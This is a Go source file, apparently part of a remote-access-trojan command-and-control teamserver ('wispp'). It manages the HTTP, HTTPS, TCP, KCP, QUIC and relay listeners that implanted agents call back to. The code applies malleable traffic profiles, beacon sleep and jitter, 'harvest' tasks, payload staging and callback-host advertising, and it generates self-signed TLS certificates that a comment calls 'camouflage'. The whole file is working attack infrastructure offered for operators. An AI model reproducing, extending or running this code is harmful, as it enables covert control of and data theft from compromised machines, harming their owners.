package listener

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	kcp "github.com/xtaci/kcp-go/v5"

	"wispp/protocol"
	"wispp/server/internal/core"
	"wispp/server/internal/db"
	"wispp/server/internal/guard"
	"wispp/server/internal/rcp"
	"wispp/server/internal/stage"
)

// Deps are shared by every managed listener.
type Deps struct {
	Hub     *core.Hub
	PSK     string
	Priv    *rsa.PrivateKey
	RCP     *rcp.Hub
	Stage   *stage.Service
	Guard   *guard.Ban
	Harvest []HarvestTask
	DataDir string
	SleepMS int
	Jitter  int
}

// Spec is one listener definition (operator-created; the teamserver boots
// with NONE — listeners are explicit, RAT-WISP style).
type Spec struct {
	ID      string `json:"id"`
	Name    string `json:"name"`    // human label, e.g. "前置HTTP-80"
	Kind    string `json:"kind"`    // http | https | tcp | rcp
	Addr    string `json:"addr"`    // bind address
	Host    string `json:"host"`    // advertised callback host[:port] for payloads; empty = addr
	Profile string `json:"profile"` // malleable profile name (http kinds)
	Project string `json:"project"`
}

// View is the console projection of a listener.
type View struct {
	Spec
	Running bool       `json:"running"`
	Agents  int        `json:"agents"`
	TLS     *TLSInfo   `json:"tls,omitempty"`
	Stats   *StatsView `json:"stats,omitempty"`
}

// StatsView is the per-listener traffic/error counter projection. HTTP counts
// bodies and response bytes; TCP/KCP/RCP count raw connection bytes.
type StatsView struct {
	Requests  uint64    `json:"requests,omitempty"`
	BytesIn   uint64    `json:"bytes_in"`
	BytesOut  uint64    `json:"bytes_out"`
	Errors    uint64    `json:"errors"`
	LastError string    `json:"last_error,omitempty"`
	LastSeen  time.Time `json:"last_seen,omitempty"`
}

type listenerStats struct {
	requests atomic.Uint64
	bytesIn  atomic.Uint64
	bytesOut atomic.Uint64
	errors   atomic.Uint64
	mu       sync.Mutex
	lastErr  string
	lastSeen time.Time
}

func (s *listenerStats) touch() {
	s.mu.Lock()
	s.lastSeen = time.Now()
	s.mu.Unlock()
}

func (s *listenerStats) fail(msg string) {
	s.errors.Add(1)
	s.mu.Lock()
	s.lastErr = msg
	s.lastSeen = time.Now()
	s.mu.Unlock()
}

func (s *listenerStats) view() *StatsView {
	s.mu.Lock()
	defer s.mu.Unlock()
	return &StatsView{
		Requests:  s.requests.Load(),
		BytesIn:   s.bytesIn.Load(),
		BytesOut:  s.bytesOut.Load(),
		Errors:    s.errors.Load(),
		LastError: s.lastErr,
		LastSeen:  s.lastSeen,
	}
}

// TLSInfo describes the certificate an https listener serves.
type TLSInfo struct {
	Subject    string    `json:"subject"`
	Issuer     string    `json:"issuer"`
	SelfSigned bool      `json:"self_signed"`
	Imported   bool      `json:"imported"`
	NotBefore  time.Time `json:"not_before"`
	NotAfter   time.Time `json:"not_after"`
	SHA256     string    `json:"sha256"`
	DNS        []string  `json:"dns,omitempty"`
	IPs        []string  `json:"ips,omitempty"`
}

var (
	ErrExists   = errors.New("listener: id exists")
	ErrNotFound = errors.New("listener: unknown id")
	ErrKind     = errors.New("listener: bad kind")
	ErrNotTLS   = errors.New("listener: certificate applies to https listeners only")
)

type running struct {
	seq    int64
	spec   Spec
	prof   *protocol.Profile
	srv    *http.Server
	ln     net.Listener
	q      *QUICListener
	stats  *listenerStats
	on     bool
	closed chan struct{}
}

// Manager owns listener lifecycle with durable rows (restart-safe).
type Manager struct {
	deps  Deps
	mu    sync.Mutex
	live  map[string]*running
	order map[string]int64 // stable creation order across stop/start
	seqno int64
	store *db.Store
}

func NewManager(deps Deps, store *db.Store) *Manager {
	return &Manager{deps: deps, live: make(map[string]*running), order: make(map[string]int64), store: store}
}

func genID() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// ResolveProfile looks up a stored profile by name; falls back to builtin
// "generic".
func (m *Manager) ResolveProfile(name string) *protocol.Profile {
	if name == "" || name == "generic" || m.store == nil {
		p := protocol.DefaultProfile()
		_ = p.Validate()
		return p
	}
	if m.store != nil {
		if body, ok := m.store.ProfileGet(name); ok {
			p := &protocol.Profile{}
			if err := jsonUnmarshal([]byte(body), p); err == nil && p.Validate() == nil {
				p.Name = name
				return p
			}
		}
	}
	for _, b := range protocol.BuiltinProfiles() {
		// builtin library (generic/github-api/…) is always resolvable
		if b.Name == name {
			cp := *b
			_ = cp.Validate()
			return &cp
		}
	}
	p := protocol.DefaultProfile()
	_ = p.Validate()
	return p
}

// Create registers (and starts) a listener.
func (m *Manager) Create(spec Spec) (*View, error) {
	switch spec.Kind {
	case "http", "https", "tcp", "kcp", "rcp", "rcp-kcp", "quic":
	default:
		return nil, ErrKind
	}
	if spec.ID == "" {
		spec.ID = genID()
	}
	if spec.Project == "" {
		spec.Project = "default"
	}
	if spec.Name == "" {
		spec.Name = spec.Kind + "-" + spec.Addr[strings.LastIndexAny(spec.Addr, ":")+1:]
	}
	m.mu.Lock()
	if _, dup := m.live[spec.ID]; dup {
		m.mu.Unlock()
		return nil, ErrExists
	}
	m.mu.Unlock()
	if err := m.start(spec); err != nil {
		return nil, err
	}
	if m.store != nil {
		_ = m.store.ListenerUpsert(&db.ListenerRow{ID: spec.ID, Name: spec.Name, Kind: spec.Kind, Addr: spec.Addr, Host: spec.Host, Profile: spec.Profile, Project: spec.Project, Enabled: true})
	}
	return &View{Spec: spec, Running: true, Agents: 0}, nil
}

func (m *Manager) start(spec Spec) error {
	r := &running{spec: spec, closed: make(chan struct{}), stats: &listenerStats{}}
	st := r.stats
	switch spec.Kind {
	case "http", "https":
		prof := m.ResolveProfile(spec.Profile)
		r.prof = prof
		hl := &HTTPListener{Addr: spec.Addr, Profile: prof}
		hl.Core.ID = spec.ID
		hl.Core.SleepMS, hl.Core.Jitter = m.deps.SleepMS, m.deps.Jitter
		// Profile timing wins over listener defaults (plan P4: profile sleep
		// is handed out at registration and must actually take effect).
		if prof.SleepMS >= protocol.MinSleepMS {
			hl.Core.SleepMS = prof.SleepMS
		}
		if prof.JitterPct > 0 && prof.JitterPct <= protocol.MaxJitterPct {
			hl.Core.Jitter = prof.JitterPct
		}
		hl.Core.Hub, hl.Core.PSK, hl.Core.Priv = m.deps.Hub, m.deps.PSK, m.deps.Priv
		hl.Core.Guard, hl.Core.Harvest, hl.Core.Project = m.deps.Guard, m.deps.Harvest, spec.Project
		hl.Core.Stage = m.deps.Stage
		hl.Core.Compress = prof.Zstd
		hl.Core.RCPAdvertise = m.rcpAdvertised
		srv := &http.Server{Addr: spec.Addr, Handler: withStats(hl.Handler(), st), ReadHeaderTimeout: 10 * time.Second}
		r.srv = srv
		go func() {
			var err error
			if spec.Kind == "https" {
				crt, key := m.certFilesFor(spec)
				err = srv.ListenAndServeTLS(crt, key)
			} else {
				err = srv.ListenAndServe()
			}
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				m.markDown(spec.ID, err)
			}
		}()
	case "quic":
		prof := m.ResolveProfile(spec.Profile)
		r.prof = prof
		ql := &QUICListener{Addr: spec.Addr, Profile: prof}
		ql.Core.ID = spec.ID
		ql.Core.SleepMS, ql.Core.Jitter = m.deps.SleepMS, m.deps.Jitter
		if prof.SleepMS >= protocol.MinSleepMS {
			ql.Core.SleepMS = prof.SleepMS
		}
		if prof.JitterPct > 0 && prof.JitterPct <= protocol.MaxJitterPct {
			ql.Core.Jitter = prof.JitterPct
		}
		ql.Core.Hub, ql.Core.PSK, ql.Core.Priv = m.deps.Hub, m.deps.PSK, m.deps.Priv
		ql.Core.Guard, ql.Core.Harvest, ql.Core.Project = m.deps.Guard, m.deps.Harvest, spec.Project
		ql.Core.Stage = m.deps.Stage
		ql.Core.Compress = prof.Zstd
		ql.Core.RCPAdvertise = m.rcpAdvertised
		crt, key := m.certFilesFor(spec)
		r.q = ql
		go func() {
			if err := ql.ListenAndServe(crt, key); err != nil {
				m.markDown(spec.ID, err)
			}
		}()
	case "kcp":
		tl := &TCPListener{Addr: spec.Addr}
		tl.Core.ID = spec.ID
		tl.Core.SleepMS, tl.Core.Jitter = m.deps.SleepMS, m.deps.Jitter
		tl.Core.Hub, tl.Core.PSK, tl.Core.Priv = m.deps.Hub, m.deps.PSK, m.deps.Priv
		tl.Core.Guard, tl.Core.Harvest, tl.Core.Project = m.deps.Guard, m.deps.Harvest, spec.Project
		tl.Core.RCPAdvertise = m.rcpAdvertised
		ln, err := kcp.ListenWithOptions(spec.Addr, nil, 0, 0)
		if err != nil {
			return err
		}
		kln := &kcpListener{Listener: ln}
		r.ln = kln
		go func() {
			if err := tl.Serve(&statsListener{Listener: kln, st: st}); err != nil {
				m.markDown(spec.ID, err)
			}
		}()
	case "tcp":
		tl := &TCPListener{Addr: spec.Addr}
		tl.Core.ID = spec.ID
		tl.Core.SleepMS, tl.Core.Jitter = m.deps.SleepMS, m.deps.Jitter
		tl.Core.Hub, tl.Core.PSK, tl.Core.Priv = m.deps.Hub, m.deps.PSK, m.deps.Priv
		tl.Core.Guard, tl.Core.Harvest, tl.Core.Project = m.deps.Guard, m.deps.Harvest, spec.Project
		tl.Core.RCPAdvertise = m.rcpAdvertised
		ln, err := net.Listen("tcp", spec.Addr)
		if err != nil {
			return err
		}
		r.ln = ln
		go func() {
			if err := tl.Serve(&statsListener{Listener: ln, st: st}); err != nil {
				m.markDown(spec.ID, err)
			}
		}()
	case "rcp":
		if m.deps.RCP == nil {
			return errors.New("listener: rcp hub unavailable")
		}
		ln, err := net.Listen("tcp", spec.Addr)
		if err != nil {
			return err
		}
		r.ln = ln
		go m.deps.RCP.Serve(&statsListener{Listener: ln, st: st})
	case "rcp-kcp":
		if m.deps.RCP == nil {
			return errors.New("listener: rcp hub unavailable")
		}
		ln, err := kcp.ListenWithOptions(spec.Addr, nil, 0, 0)
		if err != nil {
			return err
		}
		r.ln = &kcpListener{Listener: ln}
		go m.deps.RCP.Serve(&statsListener{Listener: r.ln, st: st})
	}
	m.mu.Lock()
	r.on = true
	if m.order == nil {
		m.order = map[string]int64{}
	}
	if q, ok := m.order[spec.ID]; ok {
		r.seq = q
	} else {
		m.seqno++
		r.seq = m.seqno
		m.order[spec.ID] = m.seqno
	}
	m.live[spec.ID] = r
	m.mu.Unlock()
	m.deps.Hub.Emit("info", "listener", spec.Project, "listener %s (%s %s) started", spec.Name, spec.Kind, spec.Addr)
	return nil
}

// RCPAdvertised returns the live Type2 dial target ("" = none).
func (m *Manager) RCPAdvertised() string { return m.rcpAdvertised() }

func (m *Manager) rcpAdvertised() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	// Map iteration is randomized, and a teamserver commonly runs several
	// RCP-ish listeners at once (dev loopback, kcp, a public advertise host).
	// Pick the same target every time — explicit host first, plain rcp before
	// kcp, then creation order — so an agent never gets told to dial a
	// transport it does not support.
	var best *running
	bestRank := 0
	for _, r := range m.live {
		if !r.on {
			continue
		}
		var rank int
		switch {
		case r.spec.Kind == "rcp" && r.spec.Host != "":
			rank = 4
		case r.spec.Kind == "rcp":
			rank = 3
		case r.spec.Kind == "rcp-kcp" && r.spec.Host != "":
			rank = 2
		case r.spec.Kind == "rcp-kcp":
			rank = 1
		default:
			continue
		}
		if best == nil || rank > bestRank || (rank == bestRank && r.seq < best.seq) {
			best, bestRank = r, rank
		}
	}
	if best == nil {
		return ""
	}
	h := best.spec.Host
	if h == "" {
		h = best.spec.Addr
	}
	if best.spec.Kind == "rcp-kcp" {
		h = "kcp://" + h
	}
	return h
}

func (m *Manager) markDown(id string, err error) {
	m.mu.Lock()
	if r, ok := m.live[id]; ok {
		r.on = false
		if err != nil {
			m.deps.Hub.Emit("err", "listener", r.spec.Project, "listener %s died: %v", id, err)
		}
	}
	m.mu.Unlock()
}

// MetaUpdate changes display-only listener fields without reopening the socket.
type MetaUpdate struct {
	Name *string
	Host *string
}

// UpdateMeta applies a name/advertised-host change in place.
func (m *Manager) UpdateMeta(id string, upd MetaUpdate) error {
	m.mu.Lock()
	r, ok := m.live[id]
	if !ok {
		m.mu.Unlock()
		return ErrNotFound
	}
	if upd.Name != nil {
		if n := strings.TrimSpace(*upd.Name); n != "" {
			r.spec.Name = n
		}
	}
	if upd.Host != nil {
		r.spec.Host = strings.TrimSpace(*upd.Host)
	}
	spec, on := r.spec, r.on
	m.mu.Unlock()
	if m.store != nil {
		_ = m.store.ListenerUpsert(&db.ListenerRow{ID: spec.ID, Name: spec.Name, Kind: spec.Kind, Addr: spec.Addr, Host: spec.Host, Profile: spec.Profile, Project: spec.Project, Enabled: on})
	}
	m.deps.Hub.Emit("info", "listener", spec.Project, "listener %s updated", id)
	return nil
}

// Stop closes sockets; row stays (disabled) for restart.
func (m *Manager) Stop(id string) error {
	m.mu.Lock()
	r, ok := m.live[id]
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	if r.srv != nil {
		_ = r.srv.Close()
	}
	if r.ln != nil {
		_ = r.ln.Close()
	}
	if r.q != nil {
		_ = r.q.Close()
	}
	m.mu.Lock()
	r.on = false
	m.mu.Unlock()
	if m.store != nil {
		_ = m.store.ListenerUpsert(&db.ListenerRow{ID: r.spec.ID, Name: r.spec.Name, Kind: r.spec.Kind, Addr: r.spec.Addr, Host: r.spec.Host, Profile: r.spec.Profile, Project: r.spec.Project, Enabled: false})
	}
	m.deps.Hub.Emit("warn", "listener", r.spec.Project, "listener %s stopped", id)
	return nil
}

// Start (re)opens a stopped listener.
func (m *Manager) Start(id string) error {
	m.mu.Lock()
	r, ok := m.live[id]
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	if r.on {
		return nil
	}
	m.mu.Lock()
	delete(m.live, id)
	m.mu.Unlock()
	if err := m.start(r.spec); err != nil {
		return err
	}
	if m.store != nil {
		_ = m.store.ListenerUpsert(&db.ListenerRow{ID: r.spec.ID, Name: r.spec.Name, Kind: r.spec.Kind, Addr: r.spec.Addr, Host: r.spec.Host, Profile: r.spec.Profile, Project: r.spec.Project, Enabled: true})
	}
	return nil
}

// Delete stops and forgets a listener.
func (m *Manager) Delete(id string) error {
	m.mu.Lock()
	_, ok := m.live[id]
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	_ = m.Stop(id)
	m.mu.Lock()
	delete(m.live, id)
	delete(m.order, id)
	m.mu.Unlock()
	if m.store != nil {
		_ = m.store.ListenerDelete(id)
	}
	return nil
}

// SetCert installs an operator-provided PEM pair on an https listener and
// restarts it so the new certificate is served immediately.
func (m *Manager) SetCert(id string, certPEM, keyPEM []byte) error {
	m.mu.Lock()
	r, ok := m.live[id]
	var kind string
	if ok {
		kind = r.spec.Kind
	}
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	if kind != "https" {
		return ErrNotTLS
	}
	pair, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return fmt.Errorf("listener: cert/key mismatch: %w", err)
	}
	leaf, err := x509.ParseCertificate(pair.Certificate[0])
	if err != nil {
		return fmt.Errorf("listener: certificate: %w", err)
	}
	if !leaf.NotAfter.After(time.Now()) {
		return errors.New("listener: certificate is already expired")
	}
	crt, key := m.customCertFiles(id)
	if err := os.MkdirAll(filepath.Dir(crt), 0o700); err != nil {
		return err
	}
	if err := os.WriteFile(crt, certPEM, 0o600); err != nil {
		return err
	}
	if err := os.WriteFile(key, keyPEM, 0o600); err != nil {
		return err
	}
	return m.restart(id)
}

// ClearCert removes an imported pair and falls back to the self-signed cert.
func (m *Manager) ClearCert(id string) error {
	m.mu.Lock()
	r, ok := m.live[id]
	var kind string
	if ok {
		kind = r.spec.Kind
	}
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	if kind != "https" {
		return ErrNotTLS
	}
	crt, key := m.customCertFiles(id)
	for _, p := range []string{crt, key} {
		if err := os.Remove(p); err != nil && !os.IsNotExist(err) {
			return err
		}
	}
	return m.restart(id)
}

func (m *Manager) restart(id string) error {
	m.mu.Lock()
	r, ok := m.live[id]
	on := ok && r.on
	m.mu.Unlock()
	if !ok {
		return ErrNotFound
	}
	if !on {
		return nil
	}
	if err := m.Stop(id); err != nil {
		return err
	}
	return m.Start(id)
}

// List snapshots all listeners with live agent counts.
func (m *Manager) List() []View {
	m.mu.Lock()
	defer m.mu.Unlock()
	rs := make([]*running, 0, len(m.live))
	for _, r := range m.live {
		rs = append(rs, r)
	}
	sort.Slice(rs, func(i, j int) bool {
		if rs[i].seq != rs[j].seq {
			return rs[i].seq < rs[j].seq
		}
		return rs[i].spec.Name < rs[j].spec.Name
	})
	out := make([]View, 0, len(rs))
	for _, r := range rs {
		v := View{Spec: r.spec, Running: r.on, Agents: m.deps.Hub.ListenerCount(r.spec.ID)}
		if r.spec.Kind == "https" {
			v.TLS = m.certInfo(r.spec)
		}
		if r.stats != nil {
			v.Stats = r.stats.view()
		}
		out = append(out, v)
	}
	return out
}

// Restore re-creates persisted listeners at boot (enabled rows only).
func (m *Manager) Restore() error {
	if m.store == nil {
		return nil
	}
	rows, err := m.store.Listeners()
	if err != nil {
		return err
	}
	for _, l := range rows {
		spec := Spec{ID: l.ID, Name: l.Name, Kind: l.Kind, Addr: l.Addr, Host: l.Host, Profile: l.Profile, Project: l.Project}
		if _, err := m.Create(spec); err != nil && !errors.Is(err, ErrExists) {
			m.deps.Hub.Emit("warn", "listener", l.Project, "restore %s failed: %v", l.ID, err)
		}
	}
	return nil
}

// ServersFor returns agent-facing endpoints for payloads bound to a listener
// (plus its TCP/RCP siblings).
func (m *Manager) ServersFor(id string) ([]string, string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	_, ok := m.live[id]
	if !ok {
		return nil, "", ErrNotFound
	}
	// payload binds to THIS listener only: its submit path comes from its own
	// profile, so cross-listener failover would 404 on mismatched URIs.
	// (multi-endpoint failover is a later option behind an explicit toggle.)
	var servers []string
	uri := ""
	x := m.live[id]
	switch x.spec.Kind {
	case "http", "https":
		scheme := "http"
		if x.spec.Kind == "https" {
			scheme = "https"
		}
		servers = []string{scheme + "://" + advertisedAddr(x.spec)}
		if x.prof != nil && len(x.prof.URIs) > 0 {
			uri = x.prof.URIs[0]
		}
	case "tcp":
		servers = []string{"tcp://" + advertisedAddr(x.spec)}
	case "quic":
		servers = []string{"quic://" + advertisedAddr(x.spec)}
		if x.prof != nil && len(x.prof.URIs) > 0 {
			uri = x.prof.URIs[0]
		}
	case "rcp":
		return nil, "", errors.New("listener: rcp is not an agent-facing Type1 endpoint")
	}
	return servers, uri, nil
}

// advertisedAddr keeps the configured host's port; a bare advertised host gets
// the listener's port appended so payloads dial the right endpoint.
func advertisedAddr(spec Spec) string {
	if spec.Host == "" {
		return spec.Addr
	}
	adv := spec.Host
	if _, port, err := net.SplitHostPort(spec.Addr); err == nil {
		if _, _, err := net.SplitHostPort(adv); err != nil {
			adv = net.JoinHostPort(adv, port)
		}
	}
	return adv
}

// AnyHTTP returns the most reachable running http/https listener (payload
// default). An advertised non-loopback endpoint wins over loopback, then http
// over https, then creation order — plain map iteration is random.
func (m *Manager) AnyHTTP() (Spec, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	var cands []*running
	for _, r := range m.live {
		if (r.spec.Kind == "http" || r.spec.Kind == "https") && r.on {
			cands = append(cands, r)
		}
	}
	if len(cands) == 0 {
		return Spec{}, false
	}
	sort.SliceStable(cands, func(i, j int) bool {
		a, b := cands[i], cands[j]
		if as, bs := advertiseScore(a.spec), advertiseScore(b.spec); as != bs {
			return as > bs
		}
		if ah, bh := a.spec.Kind == "http", b.spec.Kind == "http"; ah != bh {
			return ah
		}
		if m.order[a.spec.ID] != m.order[b.spec.ID] {
			return m.order[a.spec.ID] < m.order[b.spec.ID]
		}
		return a.spec.ID < b.spec.ID
	})
	return cands[0].spec, true
}

// advertiseScore ranks how well a target can dial this listener: explicit
// non-loopback advertise (3) > loopback (2) > wildcard/empty (1).
func advertiseScore(s Spec) int {
	adv := s.Addr
	if s.Host != "" {
		adv = s.Host
	}
	host := adv
	if h, _, err := net.SplitHostPort(adv); err == nil {
		host = h
	}
	host = strings.Trim(host, "[]")
	if host == "" || host == "0.0.0.0" || host == "::" {
		return 1
	}
	if host == "localhost" {
		return 2
	}
	if ip := net.ParseIP(host); ip != nil {
		if ip.IsUnspecified() {
			return 1
		}
		if ip.IsLoopback() {
			return 2
		}
	}
	return 3
}

// selfSigned materializes a localhost cert for https listeners (session layer
// is already encrypted; TLS here is camouflage, plan §3).
func (m *Manager) selfSigned(addr, advertise string) (string, string) {
	bindHost := hostOnly(addr)
	if bindHost == "" || bindHost == "0.0.0.0" || bindHost == "::" {
		bindHost = "127.0.0.1"
	}
	advHost := hostOnly(advertise)
	commonName := bindHost
	names := []string{bindHost}
	if advHost != "" && advHost != "0.0.0.0" && advHost != "::" {
		commonName = advHost
		if advHost != bindHost {
			names = append(names, advHost)
		}
	}
	crt, key := m.certFiles(addr)
	if _, err := os.Stat(crt); err == nil {
		return crt, key
	}
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return "", ""
	}
	var dns []string
	var ips []net.IP
	for _, n := range names {
		if ip := net.ParseIP(n); ip != nil {
			ips = append(ips, ip)
		} else {
			dns = append(dns, n)
		}
	}
	tmpl := x509.Certificate{
		SerialNumber:          big.NewInt(time.Now().Unix()),
		Subject:               pkix.Name{CommonName: commonName},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().AddDate(5, 0, 0),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:              dns,
		IPAddresses:           ips,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}
	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &priv.PublicKey, priv)
	if err != nil {
		return "", ""
	}
	pk, _ := x509.MarshalECPrivateKey(priv)
	_ = os.WriteFile(crt, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
	_ = os.WriteFile(key, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: pk}), 0o600)
	return crt, key
}

// jsonUnmarshal decodes a stored profile body.
func jsonUnmarshal(b []byte, v any) error { return json.Unmarshal(b, v) }

// certFiles returns the auto-generated certificate/key paths for an https
// listener (deterministic per bind address).
func (m *Manager) certFiles(addr string) (string, string) {
	slug := strings.NewReplacer(":", "_", ".", "_").Replace(addr)
	base := filepath.Join(m.deps.DataDir, "tls_"+slug)
	return base + ".pem", base + ".key"
}

// customCertFiles returns the operator-imported certificate/key paths.
func (m *Manager) customCertFiles(id string) (string, string) {
	base := filepath.Join(m.deps.DataDir, "certs", id)
	return base + ".pem", base + ".key"
}

// certFilesFor prefers an imported pair and falls back to a self-signed cert.
func (m *Manager) certFilesFor(spec Spec) (string, string) {
	if crt, key := m.customCertFiles(spec.ID); fileExists(crt) && fileExists(key) {
		return crt, key
	}
	return m.selfSigned(spec.Addr, spec.Host)
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// hostOnly strips a port from host:port (IPv6 brackets included).
func hostOnly(addr string) string {
	if h, _, err := net.SplitHostPort(addr); err == nil {
		return strings.Trim(h, "[]")
	}
	return strings.Trim(strings.TrimSpace(addr), "[]")
}

// certInfo parses the certificate served by an https listener. Nil means the
// listener has not started yet (or the file is unreadable).
func (m *Manager) certInfo(spec Spec) *TLSInfo {
	crt, _ := m.certFiles(spec.Addr)
	imported := false
	if c, k := m.customCertFiles(spec.ID); fileExists(c) && fileExists(k) {
		crt, imported = c, true
	}
	b, err := os.ReadFile(crt)
	if err != nil {
		return nil
	}
	block, _ := pem.Decode(b)
	if block == nil {
		return nil
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil
	}
	sum := sha256.Sum256(cert.Raw)
	info := &TLSInfo{
		Subject:    cert.Subject.String(),
		Issuer:     cert.Issuer.String(),
		SelfSigned: cert.CheckSignatureFrom(cert) == nil,
		Imported:   imported,
		NotBefore:  cert.NotBefore,
		NotAfter:   cert.NotAfter,
		SHA256:     fmt.Sprintf("%x", sum),
	}
	seen := make(map[string]bool)
	for _, d := range cert.DNSNames {
		if !seen[d] {
			info.DNS = append(info.DNS, d)
			seen[d] = true
		}
	}
	for _, ip := range cert.IPAddresses {
		s := ip.String()
		if !seen[s] {
			info.IPs = append(info.IPs, s)
			seen[s] = true
		}
	}
	return info
}

// withStats counts HTTP requests, body/response bytes and 5xx responses.
func withStats(h http.Handler, st *listenerStats) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		st.requests.Add(1)
		st.touch()
		cw := &countWriter{ResponseWriter: w, status: http.StatusOK}
		var cr *countReader
		if r.Body != nil {
			cr = &countReader{ReadCloser: r.Body}
			r.Body = cr
		}
		h.ServeHTTP(cw, r)
		if cr != nil {
			st.bytesIn.Add(uint64(cr.n))
		}
		st.bytesOut.Add(uint64(cw.n))
		if cw.status >= 500 {
			st.fail(fmt.Sprintf("%s %s -> %d", r.Method, r.URL.Path, cw.status))
		}
	})
}

type countWriter struct {
	http.ResponseWriter
	status int
	n      int64
}

func (c *countWriter) WriteHeader(code int) {
	c.status = code
	c.ResponseWriter.WriteHeader(code)
}

func (c *countWriter) Write(b []byte) (int, error) {
	n, err := c.ResponseWriter.Write(b)
	c.n += int64(n)
	return n, err
}

func (c *countWriter) Flush() {
	if f, ok := c.ResponseWriter.(http.Flusher); ok {
		f.Flush()
	}
}

type countReader struct {
	io.ReadCloser
	n int64
}

func (r *countReader) Read(b []byte) (int, error) {
	n, err := r.ReadCloser.Read(b)
	r.n += int64(n)
	return n, err
}

// statsListener counts raw bytes on TCP/KCP/RCP connections.
type statsListener struct {
	net.Listener
	st *listenerStats
}

func (l *statsListener) Accept() (net.Conn, error) {
	c, err := l.Listener.Accept()
	if err != nil {
		if !errors.Is(err, net.ErrClosed) {
			l.st.fail(err.Error())
		}
		return nil, err
	}
	return &statsConn{Conn: c, st: l.st}, nil
}

type statsConn struct {
	net.Conn
	st *listenerStats
}

func (c *statsConn) Read(b []byte) (int, error) {
	n, err := c.Conn.Read(b)
	if n > 0 {
		c.st.bytesIn.Add(uint64(n))
		c.st.touch()
	}
	if err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, net.ErrClosed) {
		c.st.fail(err.Error())
	}
	return n, err
}

func (c *statsConn) Write(b []byte) (int, error) {
	n, err := c.Conn.Write(b)
	if n > 0 {
		c.st.bytesOut.Add(uint64(n))
		c.st.touch()
	}
	if err != nil && !errors.Is(err, net.ErrClosed) {
		c.st.fail(err.Error())
	}
	return n, err
}

// kcpListener configures accepted KCP conns: nodelay ARQ + stream mode so the
// packet-framed listeners read it exactly like TCP (plan §2.3 params).
type kcpListener struct{ net.Listener }

func (l *kcpListener) Accept() (net.Conn, error) {
	if kl, ok := l.Listener.(*kcp.Listener); ok {
		s, err := kl.AcceptKCP() // typed handle so we can set ARQ options
		if err != nil {
			return nil, err
		}
		s.SetNoDelay(1, 10, 2, 1) // plan §2.3: nodelay/10ms/resend2/nocg
		s.SetStreamMode(true)
		return s, nil
	}
	return l.Listener.Accept()
}
